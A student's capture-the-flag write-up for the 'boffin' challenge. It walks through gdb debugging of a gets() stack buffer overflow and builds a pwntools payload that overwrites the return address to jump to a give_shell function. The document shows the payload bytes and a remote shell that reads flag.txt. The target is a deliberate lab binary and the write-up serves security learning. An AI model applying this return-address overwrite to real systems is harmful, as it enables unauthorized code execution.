Points: 150
Location: `nc offsec-chalbroker.osiris.cyber.nyu.edu 1337`
Download: `boffin`
###### Prompt
![[Pasted image 20240223135311.png]]
###### First Run:
```
┌──(kali㉿kali)-[~/Desktop/4-Week]
└─$ ./boffin     
Hey! What's your name?
Juneau
Hi, Juneau
```
###### Main Method:
```c
undefined8 main(EVP_PKEY_CTX *param_1)

{
  char name [32];
  
  init(param_1);
  puts("Hey! What\'s your name?");
  gets(name);
  printf("Hi, %s\n",name);
  return 0;
}
```
We can see here that this bad boy uses `gets`

Now, main doesn't seem to call anything else, but if we look over at our functions list we'll see one pretty cool one here:
![[Pasted image 20240223140018.png]]
She's beautiful!
```c
void give_shell(void)

{
  system("/bin/sh");
  return;
}
```

So, my theory is that anything after 32 chars will be our valid answer
###### Main Method Assembly
```
undefined main()
	004006d6	PUSH       RBP
	004006d7	MOV        RBP,RSP
	004006da	SUB        RSP,0x20
	004006de 	MOV        EAX,0x0
	004006e3	CALL       init     
	004006e8	MOV        EDI,  
	004006ed	CALL       <EXTERNAL>::puts  int puts(char * __s)
	004006f2	LEA        RAX=>name,[RBP + -0x20]
	004006f6	MOV        RDI,RAX
	004006f9	CALL       <EXTERNAL>::gets   
	004006fe	LEA        RAX=>name,[RBP + -0x20]
	00400702	MOV        RSI,RAX
	00400705	MOV        EDI,s_Hi,_%s_004007c3                  
	0040070a	MOV        EAX,0x0
	0040070f	CALL       <EXTERNAL>::printf   
	00400714	MOV        EAX,0x0
	00400719	LEAVE
	0040071a	RET
```

Before the call to `gets`, the program saves `[RBP + -0x20]` in `RAX` and then `RDI`
```
undefined main()
	...omitted for brevity...
	004006ed	CALL       <EXTERNAL>::puts  int puts(char * __s)
	004006f2	LEA        RAX=>name,[RBP + -0x20]
	004006f6	MOV        RDI,RAX
	004006f9	CALL       <EXTERNAL>::gets   
	004006fe	LEA        RAX=>name,[RBP + -0x20]
	00400702	MOV        RSI,RAX
	...omitted for brevity...
	0040071a	RET
```
**Note** that offset of 0x20 accounts for exactly 32 characters, like I said

Testing
Set breakpoints, calculate

main assembly
```
Dump of assembler code for function main:
   0x00000000004006d6 <+0>:     push   %rbp
   0x00000000004006d7 <+1>:     mov    %rsp,%rbp
   0x00000000004006da <+4>:     sub    $0x20,%rsp
   0x00000000004006de <+8>:     mov    $0x0,%eax
   0x00000000004006e3 <+13>:    call   0x4006b2 <init>
   0x00000000004006e8 <+18>:    mov    $0x4007ac,%edi
   0x00000000004006ed <+23>:    call   0x400540 <puts@plt>
   0x00000000004006f2 <+28>:    lea    -0x20(%rbp),%rax
   0x00000000004006f6 <+32>:    mov    %rax,%rdi
   0x00000000004006f9 <+35>:    call   0x400590 <gets@plt>
   0x00000000004006fe <+40>:    lea    -0x20(%rbp),%rax
   0x0000000000400702 <+44>:    mov    %rax,%rsi
   0x0000000000400705 <+47>:    mov    $0x4007c3,%edi
   0x000000000040070a <+52>:    mov    $0x0,%eax
   0x000000000040070f <+57>:    call   0x400560 <printf@plt>
   0x0000000000400714 <+62>:    mov    $0x0,%eax
   0x0000000000400719 <+67>:    leave
   0x000000000040071a <+68>:    ret

```

Attempt
Setting breaks at
* call to `gets`
	`0x00000000004006f9`
* Beginning of `gets`
	`0x00007ffff7e40050`
* After the first four stack pushes in `gets`
	`0x00007ffff7e40056`
* after `gets` returns and we save data in rax
	`0x0000000000400702`
* at call to print
	`0x000000000040070f`
* At first line in `print`
	`0x00007ffff7e1db30`

Looking for
1) addr of gets pushed onto stack before its called (or a register)
2) Addr of prints in the stack before call
###### Setting Breaks
```
┌──(kali㉿kali)-[~/Desktop/4-Week]
└─$ gdb ./boffin                 
(gdb) break main
Breakpoint 1 at 0x4006da
(gdb) r

Breakpoint 1, 0x00000000004006da in main ()
(gdb) disas main
Dump of assembler code for function main:
   0x00000000004006d6 <+0>:     push   %rbp
   0x00000000004006d7 <+1>:     mov    %rsp,%rbp
=> 0x00000000004006da <+4>:     sub    $0x20,%rsp
   ...omitted for brevity...
   0x00000000004006f9 <+35>:    call   0x400590 <gets@plt>
   0x00000000004006fe <+40>:    lea    -0x20(%rbp),%rax
   0x0000000000400702 <+44>:    mov    %rax,%rsi
   0x0000000000400705 <+47>:    mov    $0x4007c3,%edi
   0x000000000040070a <+52>:    mov    $0x0,%eax
   0x000000000040070f <+57>:    call   0x400560 <printf@plt>
   0x0000000000400714 <+62>:    mov    $0x0,%eax
   0x0000000000400719 <+67>:    leave
   0x000000000040071a <+68>:    ret
End of assembler dump.
(gdb) break *0x00000000004006f9
Breakpoint 2 at 0x4006f9
(gdb) disas gets
Dump of assembler code for function _IO_gets:
Address range 0x7ffff7e40050 to 0x7ffff7e40222:
   0x00007ffff7e40050 <+0>:     push   %r13
   0x00007ffff7e40052 <+2>:     push   %r12
   0x00007ffff7e40054 <+4>:     push   %rbp
   0x00007ffff7e40055 <+5>:     push   %rbx
   0x00007ffff7e40056 <+6>:     mov    %rdi,%rbx
   ...omitted for brevity...
(gdb) disas printf
Dump of assembler code for function __printf:
   0x00007ffff7e1db30 <+0>:     sub    $0xd8,%rsp
   ...omitted for brevity..
(gdb) break *0x00000000004006f9
Breakpoint 2 at 0x4006f9
(gdb) break *0x00007ffff7e40050
Breakpoint 3 at 0x7ffff7e40050: file ./libio/iogets.c, line 37.
(gdb) break *0x00007ffff7e40056
Breakpoint 4 at 0x7ffff7e40056: file ./libio/iogets.c, line 37.
(gdb) break *0x0000000000400702
Breakpoint 5 at 0x400702
(gdb) break *0x000000000040070f
Breakpoint 6 at 0x40070f
(gdb) break *0x00007ffff7e1db30
Breakpoint 7 at 0x7ffff7e1db30: file ./stdio-common/printf.c, line 28.
```

Entering 32 As
```
Continuing.
Hey! What's your name?

Breakpoint 2, 0x00000000004006f9 in main ()
(gdb) info registers
rax            0x7fffffffddd0      140737488346576
rbx            0x7fffffffdf08      140737488346888
rcx            0x7ffff7ec2b00      140737352837888
rdx            0x0                 0
rsi            0x7ffff7f9f803      140737353742339
rdi            0x7fffffffddd0      140737488346576
rbp            0x7fffffffddf0      0x7fffffffddf0
rsp            0x7fffffffddd0      0x7fffffffddd0
...omitted for brevity...
rip            0x4006f9            0x4006f9 <main+35>
(gdb) x/20x $sp
0x7fffffffddd0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdde0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffddf0: 0x00000001      0x00000000      0xf7df26ca      0x00007fff
0x7fffffffde00: 0x00000000      0x00000000      0x004006d6      0x00000000
0x7fffffffde10: 0x00000000      0x00000001      0xffffdf08      0x00007fff
(gdb) c
Continuing.

Breakpoint 3, _IO_gets (buf=0x7fffffffddd0 "") at ./libio/iogets.c:37
37      ./libio/iogets.c: No such file or directory.
(gdb) info registers
rax            0x7fffffffddd0      140737488346576
rbx            0x7fffffffdf08      140737488346888
rcx            0x7ffff7ec2b00      140737352837888
rdx            0x0                 0
rsi            0x7ffff7f9f803      140737353742339
rdi            0x7fffffffddd0      140737488346576
rbp            0x7fffffffddf0      0x7fffffffddf0
rsp            0x7fffffffddc8      0x7fffffffddc8
rip            0x7ffff7e40050      0x7ffff7e40050 <_IO_gets>

(gdb) x/28 $sp
0x7fffffffddc8: 0x004006fe      0x00000000      0x00000000      0x00000000
0x7fffffffddd8: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdde8: 0x00000000      0x00000000      0x00000001      0x00000000
0x7fffffffddf8: 0xf7df26ca      0x00007fff      0x00000000      0x00000000
0x7fffffffde08: 0x004006d6      0x00000000      0x00000000      0x00000001
0x7fffffffde18: 0xffffdf08      0x00007fff      0xffffdf08      0x00007fff
0x7fffffffde28: 0x3eab0a7b      0xeb5865ac      0x00000000      0x00000000

```
We do see that next address in `main` after the call (at `0x004006fe`) stored at the top of the stack there
```
Breakpoint 4, 0x00007ffff7e40056 in _IO_gets (buf=0x7fffffffddd0 "") at ./libio/iogets.c:37
37      in ./libio/iogets.c
(gdb) info registers
rax            0x7fffffffddd0      140737488346576
rbx            0x7fffffffdf08      140737488346888
rcx            0x7ffff7ec2b00      140737352837888
rdx            0x0                 0
rsi            0x7ffff7f9f803      140737353742339
rdi            0x7fffffffddd0      140737488346576
rbp            0x7fffffffddf0      0x7fffffffddf0
rsp            0x7fffffffdda8      0x7fffffffdda8
rip            0x7ffff7e40056      0x7ffff7e40056 <_IO_gets+6>
(gdb) x/48 $sp
0x7fffffffdda8: 0xffffdf08      0x00007fff      0xffffddf0      0x00007fff
0x7fffffffddb8: 0x00000000      0x00000000      0xffffdf18      0x00007fff
0x7fffffffddc8: 0x004006fe      0x00000000      0x00000000      0x00000000
0x7fffffffddd8: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdde8: 0x00000000      0x00000000      0x00000001      0x00000000
0x7fffffffddf8: 0xf7df26ca      0x00007fff      0x00000000      0x00000000
0x7fffffffde08: 0x004006d6      0x00000000      0x00000000      0x00000001
0x7fffffffde18: 0xffffdf08      0x00007fff      0xffffdf08      0x00007fff
0x7fffffffde28: 0x3eab0a7b      0xeb5865ac      0x00000000      0x00000000
0x7fffffffde38: 0xffffdf18      0x00007fff      0x00000000      0x00000000
0x7fffffffde48: 0xf7ffd000      0x00007fff      0x82a90a7b      0x14a79a53
0x7fffffffde58: 0x73ad0a7b      0x14a78a12      0x00000000      0x00000000
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
After we enter the name, we are back in `main`
```
Breakpoint 5, 0x0000000000400702 in main ()
(gdb) info registers
rax            0x7fffffffddd0      140737488346576
rbx            0x7fffffffdf08      140737488346888
rcx            0x7ffff7f9eaa0      140737353738912
rdx            0x0                 0
rsi            0x6022a1            6300321
rdi            0x7ffff7fa0a40      140737353747008
rbp            0x7fffffffddf0      0x7fffffffddf0
rsp            0x7fffffffddd0      0x7fffffffddd0
rip            0x400702            0x400702 <main+44>
(gdb) x/20 $sp
0x7fffffffddd0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffdde0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffddf0: 0x00000000      0x00000000      0xf7df26ca      0x00007fff
0x7fffffffde00: 0x00000000      0x00000000      0x004006d6      0x00000000
0x7fffffffde10: 0x00000000      0x00000001      0xffffdf08      0x00007fff

Breakpoint 6, 0x000000000040070f in main ()
gdb) disas main
Dump of assembler code for function main:
   0x00000000004006f9 <+35>:    call   0x400590 <gets@plt>
   0x00000000004006fe <+40>:    lea    -0x20(%rbp),%rax
   0x0000000000400702 <+44>:    mov    %rax,%rsi
   0x0000000000400705 <+47>:    mov    $0x4007c3,%edi
   0x000000000040070a <+52>:    mov    $0x0,%eax
=> 0x000000000040070f <+57>:    call   0x400560 <printf@plt>
   0x0000000000400714 <+62>:    mov    $0x0,%eax

(gdb) info registers
rax            0x0                 0
rbx            0x7fffffffdf08      140737488346888
rcx            0x7ffff7f9eaa0      140737353738912
rdx            0x0                 0
rsi            0x7fffffffddd0      140737488346576
rdi            0x4007c3            4196291
rbp            0x7fffffffddf0      0x7fffffffddf0
rsp            0x7fffffffddd0      0x7fffffffddd0
rip            0x40070f            0x40070f <main+57>
(gdb) x/20x $sp
0x7fffffffddd0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffdde0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffddf0: 0x00000000      0x00000000      0xf7df26ca      0x00007fff
0x7fffffffde00: 0x00000000      0x00000000      0x004006d6      0x00000000
0x7fffffffde10: 0x00000000      0x00000001      0xffffdf08      0x00007fff
```
Then into `printf`
```
Breakpoint 7, __printf (format=0x4007c3 "Hi, %s\n") at ./stdio-common/printf.c:28
28      ./stdio-common/printf.c: No such file or directory.
(gdb) info registers
rax            0x0                 0
rbx            0x7fffffffdf08      140737488346888
rcx            0x7ffff7f9eaa0      140737353738912
rdx            0x0                 0
rsi            0x7fffffffddd0      140737488346576
rdi            0x4007c3            4196291
rbp            0x7fffffffddf0      0x7fffffffddf0
rsp            0x7fffffffddc8      0x7fffffffddc8
rip            0x7ffff7e1db30      0x7ffff7e1db30 <__printf>
(gdb) x/28x $sp
0x7fffffffddc8: 0x00400714      0x00000000      0x41414141      0x41414141
0x7fffffffddd8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffdde8: 0x41414141      0x41414141      0x00000000      0x00000000
0x7fffffffddf8: 0xf7df26ca      0x00007fff      0x00000000      0x00000000
0x7fffffffde08: 0x004006d6      0x00000000      0x00000000      0x00000001
0x7fffffffde18: 0xffffdf08      0x00007fff      0xffffdf08      0x00007fff
0x7fffffffde28: 0x3eab0a7b      0xeb5865ac      0x00000000      0x00000000
(gdb) c
Continuing.
Hi, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[Inferior 1 (process 937110) exited normally]

```
And that address at the top of the stack is the operation after the call to `printf`
```
=> 0x000000000040070f <+57>:    call   0x400560 <printf@plt>
   0x0000000000400714 <+62>:    mov    $0x0,%eax
   0x0000000000400719 <+67>:    leave
   0x000000000040071a <+68>:    ret
```


We're gonna keep looking at that breakpoint in print now
## 33 As
```
Hey! What's your name?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 2, __printf (format=0x4007c3 "Hi, %s\n") at ./stdio-common/printf.c:28
28      ./stdio-common/printf.c: No such file or directory.
(gdb) info registers
rax            0x0                 0
rbx            0x7fffffffdf08      140737488346888
rcx            0x7ffff7f9eaa0      140737353738912
rdx            0x0                 0
rsi            0x7fffffffddd0      140737488346576
rdi            0x4007c3            4196291
rbp            0x7fffffffddf0      0x7fffffffddf0
rsp            0x7fffffffddc8      0x7fffffffddc8
r8             0x6022c2            6300354
r9             0x0                 0
r10            0x7ffff7de2590      140737351918992
r11            0x7ffff7e1db30      140737352162096
r12            0x0                 0
r13            0x7fffffffdf18      140737488346904
r14            0x0                 0
r15            0x7ffff7ffd000      140737354125312
rip            0x7ffff7e1db30      0x7ffff7e1db30 <__printf>
eflags         0x202               [ IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
(gdb) x/28x $sp
0x7fffffffddc8: 0x00400714      0x00000000      0x41414141      0x41414141
0x7fffffffddd8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffdde8: 0x41414141      0x41414141      0x00000041      0x00000000
0x7fffffffddf8: 0xf7df26ca      0x00007fff      0x00000000      0x00000000
0x7fffffffde08: 0x004006d6      0x00000000      0x00000000      0x00000001
0x7fffffffde18: 0xffffdf08      0x00007fff      0xffffdf08      0x00007fff
0x7fffffffde28: 0xd399178f      0x464e0bee      0x00000000      0x00000000
```
It looks like our As have some space to expand into


Gonna start scripting this now
Wait, I'm thinking about this all wrong, I don't want to call `printf` on a flag value stored in the program, I want to call `give_shell` when `gets` returns
Okay, fuck, this is fine
Want the breakpoint at the return call I think!
` 0x00007ffff7e400df <+143>:    ret`
Got it with my script..yeah!

But More A's does not seem to overwrite our return address...

It seems to overwrite data lower on the stack:
```
```

Well, I did get a segfault with 50 A's, I just wish I could see what was being called

OHHH LOOK AT THAT
so if we focus on when `main` returns, WE'RE GOLDEN
```
Program received signal SIGSEGV, Segmentation fault.
0x000000000040071a in main ()
(gdb) disas main
Dump of assembler code for function main:
...omitted for brevity...
   0x000000000040070f <+57>:    call   0x400560 <printf@plt>
   0x0000000000400714 <+62>:    mov    $0x0,%eax
   0x0000000000400719 <+67>:    leave
=> 0x000000000040071a <+68>:    ret
End of assembler dump.
(gdb) info registers
rax            0x0                 0
rbx            0x7fffffffdf08      140737488346888
rcx            0x0                 0
rdx            0x0                 0
rsi            0x7fffffffdc20      140737488346144
rdi            0x7fffffffdbf0      140737488346096
rbp            0x4141414141414141  0x4141414141414141
rsp            0x7fffffffddf8      0x7fffffffddf8
rip            0x40071a            0x40071a <main+68>
...omitted for brevity
(gdb) x.28x $sp
Undefined command: "x.28x".  Try "help".
(gdb) x/28x $sp
0x7fffffffddf8: 0x41414141      0x41414141      0x00004141      0x00000000
0x7fffffffde08: 0x004006d6      0x00000000      0x00000000      0x00000001
0x7fffffffde18: 0xffffdf08      0x00007fff      0xffffdf08      0x00007fff
0x7fffffffde28: 0x7160a56d      0x98161668      0x00000000      0x00000000
0x7fffffffde38: 0xffffdf18      0x00007fff      0x00000000      0x00000000
0x7fffffffde48: 0xf7ffd000      0x00007fff      0xcd62a56d      0x67e9e997
0x7fffffffde58: 0x3c66a56d      0x67e9f9d6      0x00000000      0x00000000
```

Sick so, we can count, or we can BF our number of A's

At 40 chars, we get a `BUS` error when `RBP` is overwritten
```
(gdb) $ info registers
rax            0x0                 0
rbx            0x7fffffffdf08      140737488346888
rcx            0x0                 0
rdx            0x0                 0
rsi            0x7fffffffdc20      140737488346144
rdi            0x7fffffffdbf0      140737488346096
rbp            0x4141414141414141  0x4141414141414141
```

RIP is overwritten at n = 14, then becomes something else at 16
```
0x7ffff7df0041
10
Program received signal SIGSEGV, Segmentation fault.

0x7ffff7004141
11
Program received signal SIGSEGV, Segmentation fault.

0x7fff00414141
12
Program received signal SIGSEGV, Segmentation fault.

0x7f0041414141
13
Program received signal SIGSEGV, Segmentation fault.

0x4141414141
14
Program received signal SIGSEGV, Segmentation fault.

0x414141414141
15
Program received signal SIGSEGV, Segmentation fault.

0x40071a
16



```


So that's at 13 it's completely overwritten
32 + 13 = 45

So that `rip` holds 5 characterse
```
Hey! What's your name?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCC
Hi, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCC

Program received signal SIGSEGV, Segmentation fault.
0x0000004343434343 in ?? ()
(gdb) info registers
rax            0x0                 0
rbx            0x7fffffffdf08      140737488346888
rcx            0x0                 0
rdx            0x0                 0
rsi            0x7fffffffdc20      140737488346144
rdi            0x7fffffffdbf0      140737488346096
rbp            0x4242424242424242  0x4242424242424242
rsp            0x7fffffffde00      0x7fffffffde00
r8             0x73                115
r9             0x1                 1
r10            0x0                 0
r11            0x202               514
r12            0x0                 0
r13            0x7fffffffdf18      140737488346904
r14            0x0                 0
r15            0x7ffff7ffd000      140737354125312
rip            0x4343434343        0x4343434343
eflags         0x10202             [ IF RF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0

(gdb) x/20x $sp
0x7fffffffde00: 0x00000000      0x00000000      0x004006d6      0x00000000
0x7fffffffde10: 0x00000000      0x00000001      0xffffdf08      0x00007fff
0x7fffffffde20: 0xffffdf08      0x00007fff      0x3b94c459      0xe39bdd1b
0x7fffffffde30: 0x00000000      0x00000000      0xffffdf18      0x00007fff
0x7fffffffde40: 0x00000000      0x00000000      0xf7ffd000      0x00007fff
(gdb) 

```


AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCDEFG
```
Program received signal SIGSEGV, Segmentation fault.
0x0000004746454443 in ?? ()
(gdb) info registers
rax            0x0                 0
rbx            0x7fffffffdf08      140737488346888
rcx            0x0                 0
rdx            0x0                 0
rsi            0x7fffffffdc20      140737488346144
rdi            0x7fffffffdbf0      140737488346096
rbp            0x4242424242424242  0x4242424242424242
rsp            0x7fffffffde00      0x7fffffffde00
r8             0x73                115
r9             0x1                 1
r10            0x0                 0
r11            0x202               514
r12            0x0                 0
r13            0x7fffffffdf18      140737488346904
r14            0x0                 0
r15            0x7ffff7ffd000      140737354125312
rip            0x4746454443        0x4746454443
eflags         0x10202             [ IF RF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
(gdb) 

```
So it's holding the last five in little-endian, which makes sense


Here's wher `give_shell` is in memory:
```
Dump of assembler code for function give_shell:
   0x000000000040069d <+0>:     push   %rbp
   0x000000000040069e <+1>:     mov    %rsp,%rbp
   0x00000000004006a1 <+4>:     mov    $0x4007a4,%edi
   0x00000000004006a6 <+9>:     mov    $0x0,%eax
   0x00000000004006ab <+14>:    call   0x400550 <system@plt>
   0x00000000004006b0 <+19>:    pop    %rbp
   0x00000000004006b1 <+20>:    ret
```

`40069d`
Will be split into
```
40069d
40 06 9d
Padd with 0's
00 00 40 06 9d
reverse
9d 06 40 00 00
encode as bytes?
```


Rerun shows 16 is the sweet spot, which does seem more logical
Seems like RIP is gonna hold 6 total "A's"

So if it's 48 A's (I liked I think it's 47 after double checking)

Now it seems like it's just not seeing the bytes as bytes instead of chars:
`b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x00@\x06\x9d'`
This is how it see's my payload


Okay, I managed to jank a payload together that changed something (yay!)
```python
base = b"".join([struct.pack("B", 0x41) for i in range(0,40)])
data = b"".join([struct.pack("B", 0x00), struct.pack("B", 0x00), struct.pack("B", 0x40), struct.pack("B", 0x06), struct.pack("B", 0x9d)])
payload = base + data
```
got me
```
rip            0x9d06400000        0x9d06400000
```
But oh damn, I think my little encoding is backwards
Oh I just deadass didn't reverse it, that's why


Okay, I had to increase, but look, I got a segdault in the near direction of where I wanted to be:
rip            0x40069d41          0x40069d41


I think maybe I have to go a little further to mush my 0's on there
I wonder if it deadass just isn't reading in my 0's
Like maybe if I put something superflous after them?

I did that and it put it at the BEGINNING
So how tf do I give it 0's

Maybe I can time it a few down so it only overwrites the PART
OH HOOLD UP, there's a segfault happening AFTER I get give_shell
```
0x00007ffff7e17603 in do_system (line=0x4007a4 "/bin/sh")
    at ../sysdeps/posix/system.c:148
148    ../sysdeps/posix/system.c: No such file or directory.
(gdb) $ info registers
rax            0x7ffff7fa6320      140737353769760
rbx            0x7fffffffdc68      140737488346216
rcx            0x7fffffffdc68      140737488346216
rdx            0x0                 0
rsi            0x7ffff7f6104f      140737353486415
rdi            0x7fffffffda64      140737488345700
rbp            0x7fffffffdac8      0x7fffffffdac8
rsp            0x7fffffffda58      0x7fffffffda58
r8             0x7fffffffdaa8      140737488345768
r9             0x7fffffffdf18      140737488346904
r10            0x8                 8
r11            0x246               582
r12            0x4007a4            4196260
r13            0x7fffffffdf18      140737488346904
r14            0x0                 0
r15            0x7ffff7ffd000      140737354125312
rip            0x7ffff7e17603      0x7ffff7e17603 <do_system+339>
eflags         0x10246             [ PF ZF IF RF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
--Type <RET> for more, q to quit, c to continue without paging--$ p/x *0x7ffff7e17603
gs             0x0                 0
(gdb) $ p/x *0x7ffff7e17603
$1 = 0x2444290f
(gdb) $ p/x *40069d
Invalid number "40069d".
(gdb) $ p/x *0x40069d
$2 = 0xe5894855
(gdb) $ disas hell
No symbol "hell" in current context.
(gdb) $ disas give_shell
Dump of assembler code for function give_shell:
   0x000000000040069d <+0>:    push   %rbp
   0x000000000040069e <+1>:    mov    %rsp,%rbp
   0x00000000004006a1 <+4>:    mov    $0x4007a4,%edi
   0x00000000004006a6 <+9>:    mov    $0x0,%eax
   0x00000000004006ab <+14>:    call   0x400550 <system@plt>
   0x00000000004006b0 <+19>:    pop    %rbp
   0x00000000004006b1 <+20>:    ret
End of assembler dump.
(gdb) $  zsh: suspended (signal)  python3 Boffin_Local_Debug.py

```
LOOK AT WHERE MY ERROR IS
`0x00007ffff7e17603 in do_system (line=0x4007a4 "/bin/sh")`
That's because we made it to give shell, but there's a register issue


I set a breakpoint there and it gets us there, I just wonder if I;ve overwritten other things

So what if I try this remotely?

YAY I AM A GOD!
```
┌──(kali㉿kali)-[~/Desktop/4-Week]
└─$ python3 Boffin_Remote_Exploit.py 
[+] Opening connection to offsec-chalbroker.osiris.cyber.nyu.edu on port 1337: Done
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x9d\x06@\x00\x00'
/home/kali/Desktop/4-Week/Boffin_Remote_Exploit.py:27: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("Hey! What's your name?")
[*] Switching to interactive mode

Hi, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x9d\x06@
$ whoami
pwn
$ ls
boffin
flag.txt
$ cat flag.txt
flag{access_granted_thats_real_cool}
[*] Got EOF while reading in interactive
```